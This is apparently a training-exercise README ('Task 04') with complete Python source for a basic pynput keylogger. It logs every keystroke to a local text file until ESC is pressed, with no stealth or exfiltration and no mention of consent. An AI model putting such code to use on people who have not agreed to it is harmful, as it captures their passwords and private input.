# Task 04 - Basic Keylogger Program

## 📌 Objective

Create a basic keylogger program in Python that:
- Records and logs keystrokes.
- Saves the logged keys into a file for later review.

## 🛠️ Requirements

- Python 3.x
- `pynput` library for keyboard event listening

You can install the required package using:
```bash
pip install pynput
from pynput import keyboard
from datetime import datetime

# Log file path
LOG_FILE = "key_log.txt"

# Start log with timestamp
with open(LOG_FILE, "a") as f:
    f.write(f"\n\n--- Keylogger started at {datetime.now()} ---\n")

def on_press(key):
    try:
        # Alphanumeric keys
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key.name.upper()}]")

def on_release(key):
    # Stop if ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
